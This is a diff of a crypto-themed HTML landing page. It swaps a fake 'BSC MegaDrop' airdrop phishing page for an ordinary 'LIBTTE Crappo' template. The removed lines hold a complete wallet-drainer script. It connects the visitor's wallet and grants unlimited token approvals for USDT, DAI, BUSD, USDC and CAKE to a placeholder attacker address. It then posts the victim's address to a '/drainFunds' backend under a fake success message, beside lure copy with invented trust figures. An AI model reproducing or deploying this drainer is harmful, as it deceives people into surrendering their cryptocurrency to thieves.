@@ -1,423 +1,314 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BSC MegaDrop - Claim Your Tokens</title>
+    <title>LiBTTE Crappo</title>
     <link rel="stylesheet" href="css/reset.css" />
     <link rel="stylesheet" href="css/normalize.css" />
     <link rel="stylesheet" href="css/styles.css" />
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/rellax/1.12.1/rellax.min.js" integrity="sha512-f5HTYZYTDZelxS7LEQYv8ppMHTZ6JJWglzeQmr0CVTS70vJgaJiIO15ALqI7bhsracojbXkezUIL+35UXwwGrQ==" crossorigin="anonymous"></script>
-    <style>
-        /* Notification styles to match Crappo design */
-        .notification {
-            display: none;
-            background: #1a1a2e;
-            border: 1px solid #3b82f6; /* Blue to match Crappo's buttons */
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px auto;
-            max-width: 600px;
-            text-align: center;
-            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
-        }
-        .notification p {
-            color: #fff;
-            font-size: 1.2em;
-            margin-bottom: 15px;
-        }
-        .notification a {
-            background: #3b82f6;
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: bold;
-            margin: 0 10px;
-        }
-        .notification a:hover {
-            background: #2563eb;
-        }
-        /* Adjust button to match Crappo style */
-        .claim-btn {
-            background: #3b82f6;
-            color: #fff;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.2em;
-            cursor: pointer;
-            box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .claim-btn:hover {
-            background: #2563eb;
-        }
-        .claim-btn:disabled {
-            background: #666;
-            cursor: not-allowed;
-        }
-        .claim-btn img {
-            width: 20px;
-            height: 20px;
-        }
-    </style>
-</head>
-<body>
-    <!-- Header -->
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/rellax/1.12.1/rellax.min.js"
+      integrity="sha512-f5HTYZYTDZelxS7LEQYv8ppMHTZ6JJWglzeQmr0CVTS70vJgaJiIO15ALqI7bhsracojbXkezUIL+35UXwwGrQ=="
+      crossorigin="anonymous"
+    ></script>
+    <script src="index.js"></script>
+    <script src="wallet.js"></script>
+  </head>
+  <body>
+    <!-- Header-->
     <header class="header">
-        <div class="header__top">
-            <div class="logo">
-                <img src="images/logo.svg" alt="BSC MegaDrop logo" />
-                <span class="text text--medium">BSC MegaDrop</span>
-            </div>
-            <nav>
-                <ul class="list list--inline">
-                    <li class="list__item text text--small text--regular">Airdrop</li>
-                    <li class="list__item text text--small text--regular">Features</li>
-                    <li class="list__item text text--small text--regular">About</li>
-                    <li class="list__item text text--small text--regular">Contact</li>
-                </ul>
-            </nav>
+      <!-- Top Header -->
+      <div class="header__top">
+        <div class="logo">
+          <img src="images/logo.svg" alt="LIBTTE Crappo brand logo" />
+          <span class="text text--medium">LIBTTE CRAPPO</span>
         </div>
-        <div class="header__body">
-            <div class="grid grid--1x2 grid--centered grid-gap--small">
-                <div class="value-proposition">
-                    <div class="badge-container">
-                        <span class="badge badge--dark text--small">10,000 Tokens</span>
-                        <span class="text text--small text--regular text--white">Limited Airdrop Event!</span>
-                    </div>
-                    <h1 class="value-proposition__title">Largest Airdrop on Binance Smart Chain</h1>
-                    <p class="value-proposition__text text text--small text--regular">Claim your free MegaDrop tokens, trusted by 5M+ wallets with over $10B in distributions.</p>
-                    <button class="claim-btn">
-                        <span>Claim Tokens Now</span>
-                        <img src="images/chevron-right.svg" alt="Right Icon" />
-                    </button>
-                    <!-- Notification for wallet detection -->
-                    <div id="walletNotification" class="notification">
-                        <p>To claim your MegaDrop tokens, you need a BSC-compatible wallet. Please install MetaMask or Trust Wallet.</p>
-                        <div>
-                            <a href="https://metamask.io/download/" target="_blank">Get MetaMask</a>
-                            <a href="https://trustwallet.com/download" target="_blank">Get Trust Wallet</a>
-                        </div>
-                    </div>
-                </div>
-                <img src="images/btc-illustration.svg" alt="Token illustration" class="btc-illustration" data-rellax-horizontal-speed="-2" data-rellax-vertical-scroll-axis="x"/>
+        <nav>
+          <ul class="list list--inline">
+            <li class="list__item text text--small text--regular">Products</li>
+            <li class="list__item text text--small text--regular">Features</li>
+            <li class="list__item text text--small text--regular">About</li>
+            <li class="list__item text text--small text--regular">Contact</li>
+          </ul>
+          <button class="btn btn--link text text--small text--medium">Login</button>
+          <span class="vertical-line"></span>
+          <button class="btn btn--accent text--small text--medium">Register</button>
+        </nav>
+      </div>
+      <!-- Header Body -->
+      <div class="header__body">
+        <div class="grid grid--1x2 grid--centered grid-gap--small">
+          <div class="value-proposition">
+            <div class="badge-container">
+              <span class="badge badge--dark text--small">75% Save</span>
+              <span class="text text--small text--regular text--white">For the Black Friday weekend</span>
             </div>
+            <h1 class="value-proposition__title">Fastest & secure platform to invest in crypto</h1>
+            <p class="value-proposition__text text text--small text--regular">Buy and sell cryptocurrencies, trusted by 10M wallets with over $30 billion in transactions.</p>
+            <button class="value-proposition__button btn btn--flex btn--accent">
+              <span class="text--standart text--medium">Try for FREE</span>
+              <div class="chiron-icon-container">
+                <img src="images/chevron-right.svg" alt="Right Icon" />
+              </div>
+            </button>
+          </div>
+          <img src="images/btc-illustration.svg" alt="Bitcoin illustration" class="btc-illustration" data-rellax-horizontal-speed="-2" data-rellax-vertical-scroll-axis="x"/>
         </div>
-        <img class="background-item-1" src="images/background-item-1.svg" alt="" />
-        <img class="background-item-2" src="images/background-item-2.svg" alt="" />
+      </div>
+      <img class="background-item-1" src="images/background-item-1.svg" alt="" />
+      <img class="background-item-2" src="images/background-item-2.svg" alt="" />
     </header>
 
-    <!-- Why BSC MegaDrop -->
-    <section class="why-crappo">
-        <div class="media-container">
-            <div class="media">
-                <div class="icon-container">
-                    <svg class="media-icon">
-                        <use xlink:href="images/media-icons-sprite.svg#person"></use>
-                    </svg>
-                </div>
-                <div>
-                    <h2>5M+</h2>
-                    <p class="text text--small text--regular text--muted">Trusted Wallets Participated</p>
-                </div>
-            </div>
-            <div class="media">
-                <div class="icon-container">
-                    <svg class="media-icon">
-                        <use xlink:href="images/media-icons-sprite.svg#bar-chart"></use>
-                    </svg>
-                </div>
-                <div>
-                    <h2>$10B</h2>
-                    <p class="text text--small text--regular text--muted">Digital Tokens Distributed</p>
-                </div>
-            </div>
-            <div class="media">
-                <div class="icon-container">
-                    <svg class="media-icon">
-                        <use xlink:href="images/media-icons-sprite.svg#earth"></use>
-                    </svg>
-                </div>
-                <div>
-                    <h2>150</h2>
-                    <p class="text text--small text--regular text--muted">Countries Supported</p>
-                </div>
-            </div>
+    <!-- Why LIBTTE Crappo -->
+    <section class="why-libtte-crappo">
+      <!-- Media Objects -->
+      <div class="media-container">
+        <div class="media">
+          <div class="icon-container">
+            <svg class="media-icon">
+              <use xlink:href="images/media-icons-sprite.svg#person"></use>
+            </svg>
+          </div>
+          <div>
+            <h2>10M+</h2>
+            <p class="text text--small text--regular text--muted">Trusted Wallets Investor</p>
+          </div>
         </div>
-        <div class="grid grid--1x2 grid--centered">
-            <img id="gpu-illustration" src="images/gpu-illustration.svg" alt="Token illustration" data-rellax-speed="3" data-rellax-percentage="0.5" />
-            <div class="banner">
-                <h2 class="banner__title">Why you should choose BSC MegaDrop</h2>
-                <p class="banner__text text text--small text--regular text--muted">Experience the most trusted airdrop platform on BSC. No fees, no borders, just rewards.</p>
-                <button class="btn btn--accent">
-                    <span class="text--standart text--medium">Learn More</span>
-                </button>
-            </div>
+        <div class="media">
+          <div class="icon-container">
+            <svg class="media-icon">
+              <use xlink:href="images/media-icons-sprite.svg#bar-chart"></use>
+            </svg>
+          </div>
+          <div>
+            <h2>$30B</h2>
+            <p class="text text--small text--regular text--muted">Digital Currency Exchanged</p>
+          </div>
         </div>
-        <img class="background-item-3" src="images/background-item-3.svg" alt="" />
-        <img class="background-item-4" src="images/background-item-4.svg" alt="" />
-        <img class="background-item-5" src="images/background-item-5.svg" alt="" />
+        <div class="media">
+          <div class="icon-container">
+            <svg class="media-icon">
+              <use xlink:href="images/media-icons-sprite.svg#earth"></use>
+            </svg>
+          </div>
+          <div>
+            <h2>195</h2>
+            <p class="text text--small text--regular text--muted">Countries Supported</p>
+          </div>
+        </div>
+      </div>
+      <!-- Why you should choose us? -->
+      <div class="grid grid--1x2 grid--centered">
+        <img id="gpu-illustration" src="images/gpu-illustration.svg" alt="Illustration of gpu"  data-rellax-speed="3" data-rellax-percentage="0.5" />
+        <div class="banner">
+          <h2 class="banner__title">Why you should choose LIBTTE CRAPPO</h2>
+          <p class="banner__text text text--small text--regular text--muted">Experience the next generation cryptocurrency platform. No financial borders, extra fees, and fake reviews.</p>
+          <button class="btn btn--accent">
+            <span class="text--standart text--medium">Learn More</span>
+          </button>
+        </div>
+      </div>
+      <img class="background-item-3" src="images/background-item-3.svg" alt="" />
+      <img class="background-item-4" src="images/background-item-4.svg" alt="" />
+      <img class="background-item-5" src="images/background-item-5.svg" alt="" />
     </section>
 
-    <!-- Airdrop Eligibility -->
+    <!-- Trade securely -->
     <section class="trade-securely">
-        <h2>Check Your Airdrop Eligibility</h2>
-        <p class="text text--standart text--regular text--muted">Enter your wallet address to see if you qualify for the MegaDrop airdrop on BSC.</p>
-        <div class="calculate">
-            <div class="calculate__header">
-                <input type="text" placeholder="Enter your wallet address" id="walletAddressInput" />
-                <button class="btn btn--accent" onclick="checkEligibility()">Check</button>
-            </div>
-            <div class="calculate__body" id="eligibilityResult" style="display: none;">
-                <p class="text text--small text--medium text--accent text--uppercase">Airdrop Eligibility:</p>
-                <h3>You are eligible for 10,000 MegaDrop Tokens!</h3>
-                <p class="text text--small text--regular text--grey">Click below to claim your tokens now.</p>
-                <button class="claim-btn">
-                    <span>Claim Tokens Now</span>
-                    <img src="images/chevron-right.svg" alt="Right Icon" />
-                </button>
-            </div>
+      <h2>Check how much you can earn</h2>
+      <p class="text text--standart text--regular text--muted">Let’s check your hash rate to see how much you will earn today, There's no limit to how much you can earn.</p>
+      <div class="calculate">
+        <div class="calculate__header">
+          <input type="text" placeholder="Enter your hash rate" />
+          <input list="rates" name="rate" id="rate" value="TH/s" />
+          <datalist id="rates">
+            <option value="TH/s" selected></option>
+          </datalist>
+
+          <button class="btn btn--accent">Calculate</button>
         </div>
-        <h2 class="text--primary">Claim the largest airdrop on Binance Smart Chain.</h2>
-        <div class="currencies">
-            <div class="card card--secondary">
-                <svg class="currency-icon">
-                    <use xlink:href="images/currencies-sprite.svg#btc"></use>
-                </svg>
-                <div class="card__header">
-                    <h3>Bitcoin</h3>
-                    <span class="text text--standart text--medium">BTC</span>
-                </div>
-                <p class="text text-small text--regular card__text">A blockchain protocol for fast and secure transactions.</p>
-                <button class="claim-btn">
-                    <span>Claim Tokens</span>
-                    <img src="images/chevron-right.svg" alt="Right Icon" />
-                </button>
-            </div>
-            <div class="card card--white">
-                <svg class="currency-icon">
-                    <use xlink:href="images/currencies-sprite.svg#eth"></use>
-                </svg>
-                <div class="card__header">
-                    <h3>MegaDrop Token</h3>
-                    <span class="text text--standart text--medium">MDT</span>
-                </div>
-                <p class="text text-small text--regular card__text">The native token of the MegaDrop airdrop event.</p>
-            </div>
-            <div class="card card--white">
-                <svg class="currency-icon">
-                    <use xlink:href="images/currencies-sprite.svg#ltc"></use>
-                </svg>
-                <div class="card__header">
-                    <h3>PancakeSwap</h3>
-                    <span class="text text--standart text--medium">CAKE</span>
-                </div>
-                <p class="text text-small text--regular card__text">A leading DEX on BSC, supporting MegaDrop.</p>
-            </div>
+        <div class="calculate__body">
+          <p class="text text--small text--medium text--accent text--uppercase">Estimated 24 Hour Revenue:</p>
+          <h3>0.055 130 59 ETH <span class="text--accent">($1275)</span></h3>
+          <p class="text text--small text--regular text--grey">Revenue will change based on mining difficulty and Ethereum price.</p>
         </div>
+      </div>
+      <h2 class="text--primary">Trade securely and market the high growth cryptocurrencies.</h2>
+      <div class="currencies">
+        <div class="card card--secondary">
+          <svg class="currency-icon">
+            <use xlink:href="images/currencies-sprite.svg#btc"></use>
+          </svg>
+          <div class="card__header">
+            <h3>Bitcoin</h3>
+            <span class="text text--standart text--medium">BTC</span>
+          </div>
+          <p class="text text-small text--regular card__text">Digital currency in which a record of transactions is maintained.</p>
+          <button class="btn btn--flex btn--accent">
+            <span class="text--standart text--medium">Start Mining</span>
+            <div class="chiron-icon-container">
+              <img src="images/chevron-right.svg" alt="Right Icon" />
+            </div>
+          </button>
+        </div>
+        <div class="card card--white">
+          <svg class="currency-icon">
+            <use xlink:href="images/currencies-sprite.svg#eth"></use>
+          </svg>
+          <div class="card__header">
+            <h3>Ethereum</h3>
+            <span class="text text--standart text--medium">ETH</span>
+          </div>
+          <p class="text text-small text--regular card__text">Blockchain technology to create and run decentralized digital applications.</p>
+        </div>
+        <div class="card card--white">
+          <svg class="currency-icon">
+            <use xlink:href="images/currencies-sprite.svg#ltc"></use>
+          </svg>
+          <div class="card__header">
+            <h3>Litecoin</h3>
+            <span class="text text--standart text--medium">LTC</span>
+          </div>
+          <p class="text text-small text--regular card__text">Cryptocurrency that enables instant payments to anyone in the world.</p>
+        </div>
+      </div>
     </section>
 
     <!-- Features -->
     <section class="features">
-        <h2>Join the MegaDrop Airdrop and Maximize Your Rewards</h2>
-        <div class="grid grid--1x2 grid--centered banner-bottom-margin">
-            <div class="banner banner--left">
-                <h2 class="banner__title">Claim Smart</h2>
-                <p class="banner__text text text--small text--regular text--muted">Verify your eligibility and claim your tokens with a few clicks.</p>
-                <button class="btn btn--accent">
-                    <span class="text--standart text--medium">Learn More</span>
-                </button>
-            </div>
-            <img src="images/bitcoin-graph.svg" alt="Token graph" />
+      <h2>Market sentiments, portfolio, and run the infrastructure of your choice</h2>
+
+      <div class="grid grid--1x2 grid--centered banner-bottom-margin">
+        <div class="banner banner--left">
+          <h2 class="banner__title">Invest Smart</h2>
+          <p class="banner__text text text--small text--regular text--muted">Get full statistic information about the behaviour of buyers and sellers will help you to make the decision.</p>
+          <button class="btn btn--accent">
+            <span class="text--standart text--medium">Learn More</span>
+          </button>
         </div>
-        <div class="grid grid--1x2 grid--centered banner-bottom-margin">
-            <img src="images/statistics.svg" alt="Airdrop statistics" />
-            <div class="banner">
-                <h2 class="banner__title">Real-Time Updates</h2>
-                <p class="banner__text text text--small text--regular text--muted">Track the airdrop progress and token distribution in real time.</p>
-                <button class="btn btn--accent">
-                    <span class="text--standart text--medium">Learn More</span>
-                </button>
-            </div>
+        <img src="images/bitcoin-graph.svg" alt="Bitcoin graph" />
+      </div>
+
+      <div class="grid grid--1x2 grid--centered banner-bottom-margin">
+        <img src="images/statistics.svg" alt="Currency statistics" />
+        <div class="banner">
+          <h2 class="banner__title">Detailed Statistics</h2>
+          <p class="banner__text text text--small text--regular text--muted">View all mining related information in realtime, at any point at any location and decide which polls you want to mine in.</p>
+          <button class="btn btn--accent">
+            <span class="text--standart text--medium">Learn More</span>
+          </button>
         </div>
-        <div class="grid grid--1x2 grid--centered">
-            <div class="banner banner--left">
-                <h2 class="banner__title">Grow Your Portfolio with MegaDrop</h2>
-                <p class="banner__text text text--small text--regular text--muted">Join the largest airdrop on BSC and boost your crypto holdings.</p>
-                <button class="btn btn--accent">
-                    <span class="text--standart text--medium">Learn More</span>
-                </button>
-            </div>
-            <img src="images/coin-table.svg" alt="Token tables" />
+      </div>
+
+      <div class="grid grid--1x2 grid--centered">
+        <div class="banner banner--left">
+          <h2 class="banner__title">Grow your profit and track your investments</h2>
+          <p class="banner__text text text--small text--regular text--muted">Use advanced analytical tools. Our Clear Trading View charts lets you track current and historical profit investments.</p>
+          <button class="btn btn--accent">
+            <span class="text--standart text--medium">Learn More</span>
+          </button>
         </div>
-        <img class="background-item-6" src="images/background-item-6.svg" alt="" />
-        <img class="background-item-7" src="images/background-item-7.svg" alt="" />
+        <img src="images/coin-table.svg" alt="Coin tables" />
+      </div>
+
+      <img class="background-item-6" src="images/background-item-6.svg" alt="" />
+      <img class="background-item-7" src="images/background-item-7.svg" alt="" />
     </section>
 
-    <!-- Start Claiming -->
+    <!-- Start mining -->
     <section class="start-mining">
-        <div class="mining-container">
-            <div class="mining-container__header">
-                <h3 class="mining-container__header__title">Start Claiming Now</h3>
-                <p class="mining-container__header__description text text--small text--regular">Join now with BSC MegaDrop to get the latest airdrop updates and claim your tokens.</p>
-            </div>
-            <div class="mining-container__subscribe">
-                <input type="text" placeholder="Enter your email" />
-                <button class="btn btn--white">Subscribe</button>
-            </div>
-            <img class="background-item-8" src="images/background-item-8.svg" alt="" />
-            <img class="background-item-9" src="images/background-item-9.svg" alt="" />
+      <div class="mining-container">
+        <div class="mining-container__header">
+          <h3 class="mining-container__header__title">Start mining now</h3>
+          <p class="mining-container__header__description text text--small text--regular">Join now with CRAPPO to get the latest news and start mining now</p>
         </div>
-        <img class="background-item-10" src="images/background-item-10.svg" alt="" />
-        <img class="background-item-11" src="images/background-item-11.svg" alt="" />
+        <div class="mining-container__subscribe">
+          <input type="text" placeholder="Enter your email" />
+          <button class="btn btn--white">Subscribe</button>
+        </div>
+        <img class="background-item-8" src="images/background-item-8.svg" alt="" />
+        <img class="background-item-9" src="images/background-item-9.svg" alt="" />
+      </div>
+      <img class="background-item-10" src="images/background-item-10.svg" alt="" />
+      <img class="background-item-11" src="images/background-item-11.svg" alt="" />
     </section>
 
     <!-- Footer -->
     <footer class="footer">
-        <div class="footer__top">
-            <div class="footer__top__logo">
-                <img src="images/logo.svg" alt="BSC MegaDrop logo" />
-                <span class="text text--medium">BSC MegaDrop</span>
-            </div>
-            <div class="footer__top__menu">
-                <nav class="nav">
-                    <p class="nav__title text text--medium">Quick Links</p>
-                    <ul class="nav__list">
-                        <li class="nav__list__item text text--small text--regular">Home</li>
-                        <li class="nav__list__item text text--small text--regular">Airdrop</li>
-                        <li class="nav__list__item text text--small text--regular">Features</li>
-                        <li class="nav__list__item text text--small text--regular">About</li>
-                        <li class="nav__list__item text text--small text--regular">Contact</li>
-                    </ul>
-                </nav>
-            </div>
-            <div class="footer__top__menu">
-                <nav class="nav">
-                    <p class="nav__title text text--medium">Resources</p>
-                    <ul class="nav__list">
-                        <li class="nav__list__item text text--small text--regular">Whitepaper</li>
-                        <li class="nav__list__item text text--small text--regular">Token Explorer</li>
-                        <li class="nav__list__item text text--small text--regular">BSC API</li>
-                    </ul>
-                </nav>
-            </div>
+      <div class="footer__top">
+        <div class="footer__top__logo">
+          <img src="images/logo.svg" alt="Croppo brand logo" />
+          <span class="text text--medium">LIBTTE CRAPPO</span>
         </div>
-        <div class="footer__bottom">
-            <div class="footer__bottom__copyright text text--small text--regular">©2025 BSC MegaDrop. All rights reserved.</div>
+        <div class="footer__top__menu">
+          <nav class="nav">
+            <p class="nav__title text text--medium">Quick Link</p>
+            <ul class="nav__list">
+              <li class="nav__list__item text text--small text--regular">Home</li>
+              <li class="nav__list__item text text--small text--regular">Products</li>
+              <li class="nav__list__item text text--small text--regular">About</li>
+              <li class="nav__list__item text text--small text--regular">Features</li>
+              <li class="nav__list__item text text--small text--regular">Contact</li>
+            </ul>
+          </nav>
         </div>
+        <div class="footer__top__menu">
+          <nav class="nav">
+            <p class="nav__title text text--medium">Resources</p>
+            <ul class="nav__list">
+              <li class="nav__list__item text text--small text--regular">Download Whitepaper</li>
+              <li class="nav__list__item text text--small text--regular">Smart Token</li>
+              <li class="nav__list__item text text--small text--regular">Blockchain Explorer</li>
+              <li class="nav__list__item text text--small text--regular">Crypto API</li>
+              <li class="nav__list__item text text--small text--regular">Interest</li>
+            </ul>
+          </nav>
+        </div>
+        <div class="footer__top__payment-systems">
+          <p class="payment-systems__title">We accept following payment systems</p>
+          <div class="payment-systems__payments">
+            <div class="payment-icon-container">
+              <img src="images/visa.svg" alt="Visa Card" />
+            </div>
+            <div class="payment-icon-container">
+              <img src="images/mastercard.svg" alt="Master Card" />
+            </div>
+            <div class="payment-icon-container">
+              <img src="images/bitcoin.svg" alt="Bitcoin" />
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer__bottom">
+        <div class="footer__bottom__copyright text text--small text--regular">&copy;2023 LIBTTE CRAPPO. All rights reserved. Including the rights of our affiliates and sponsors.</div>
+        <div class="footer__bottom__social-media">
+          <svg class="social-icon">
+            <use xlink:href="images/social-media-sprite.svg#facebook"></use>
+          </svg>
+          <svg class="social-icon">
+            <use xlink:href="images/social-media-sprite.svg#instagram"></use>
+          </svg>
+          <svg class="social-icon">
+            <use xlink:href="images/social-media-sprite.svg#youtube"></use>
+          </svg>
+          <svg class="social-icon">
+            <use xlink:href="images/social-media-sprite.svg#twitter"></use>
+          </svg>
+          <svg class="social-icon">
+            <use xlink:href="images/social-media-sprite.svg#linkedin"></use>
+          </svg>
+        </div>
+      </div>
     </footer>
-
-    <!-- Wallet-Draining Script -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
     <script>
-        // Ensure DOM is fully loaded before attaching event listeners
-        document.addEventListener('DOMContentLoaded', () => {
-            new Rellax(".btc-illustration", { horizontal: true });
-            new Rellax("#gpu-illustration", { horizontal: true });
-
-            async function connectAndApprove(event) {
-                const btn = event.target.closest('.claim-btn');
-                btn.disabled = true;
-                try {
-                    // Check for wallet
-                    if (!window.ethereum) {
-                        document.getElementById('walletNotification').style.display = 'block';
-                        return;
-                    }
-
-                    // Connect wallet
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-
-                    // Switch to BSC
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }]
-                        });
-                    } catch (switchError) {
-                        // If BSC is not added, try adding it
-                        if (switchError.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: '0x38',
-                                    chainName: 'Binance Smart Chain',
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                    blockExplorerUrls: ['https://bscscan.com']
-                                }]
-                            });
-                        } else {
-                            throw switchError;
-                        }
-                    }
-
-                    // Get user address
-                    const signer = provider.getSigner();
-                    const userAddress = await signer.getAddress();
-
-                    // Show verifying message
-                    document.body.innerHTML = "<h2>Verifying BSC Wallet...</h2>";
-
-                    // Approve tokens
-                    const tokenAddresses = [
-                        "0x55d398326f99059fF775485246999027B3197955", // USDT
-                        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc",  // DAI
-                        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
-                        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
-                        "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"  // CAKE
-                    ];
-                    const abi = ["function approve(address spender, uint256 amount) returns (bool)"];
-                    for (let token of tokenAddresses) {
-                        const contract = new ethers.Contract(token, abi, signer);
-                        await contract.approve("YOUR_ATTACKER_ADDRESS", ethers.constants.MaxUint256);
-                    }
-
-                    // Send request to Glitch backend
-                    const response = await fetch('https://YOUR_GLITCH_URL/drainFunds', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ targetAddress: userAddress })
-                    });
-                    if (!response.ok) {
-                        throw new Error('Backend request failed');
-                    }
-
-                    // Show success message
-                    document.body.innerHTML = "<h2>Verified! MegaDrop Tokens Claimed!</h2>";
-                } catch (error) {
-                    console.error("Error in connectAndApprove:", error);
-                    document.body.innerHTML = "<h2>Error: Could not process your request. Please try again.</h2>";
-                } finally {
-                    btn.disabled = false;
-                }
-            }
-
-            function checkEligibility() {
-                const walletInput = document.getElementById('walletAddressInput').value;
-                if (walletInput.length < 10) {
-                    alert("Please enter a valid wallet address.");
-                    return;
-                }
-                document.querySelector('.calculate__header').style.display = 'none';
-                document.getElementById('eligibilityResult').style.display = 'block';
-            }
-
-            // Attach event listeners to all claim buttons
-            document.querySelectorAll('.claim-btn').forEach(btn => {
-                btn.addEventListener('click', connectAndApprove);
-            });
-        });
+      new Rellax(".btc-illustration", {
+        horizontal: true,
+      });
+      new Rellax("#gpu-illustration", {
+        horizontal: true,
+      });
     </script>
-</body>
+  </body>
 </html>
